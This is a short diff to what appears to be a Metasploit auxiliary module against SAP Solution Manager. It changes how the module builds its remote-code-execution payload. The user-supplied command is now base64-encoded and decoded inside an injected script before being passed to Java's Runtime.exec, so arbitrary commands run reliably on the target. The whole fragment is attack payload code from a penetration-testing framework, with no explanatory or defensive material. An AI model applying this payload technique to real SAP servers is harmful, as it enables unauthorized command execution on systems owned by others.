@@ -89,7 +89,10 @@ class MetasploitModule < Msf::Auxiliary
     @ssrf_payload = make_ssrf_payload(@ssrf_method, @ssrf_uri)
 
     @rce_command = datastore['COMMAND']
-    @rce_payload = make_rce_payload("Packages.java.lang.Runtime.getRuntime().exec('#{@rce_command}').waitFor();")
+    command = "var d = Packages.java.util.Base64.getDecoder().decode('#{Rex::Text.encode_base64(@rce_command)}');"
+    command << 'var c = new Packages.java.lang.String(d);'
+    command << 'Packages.java.lang.Runtime.getRuntime().exec(c).waitFor();'
+    @rce_payload = make_rce_payload(command)
   end
 
   # Analyze runtime error message from SAP Solution Manager client
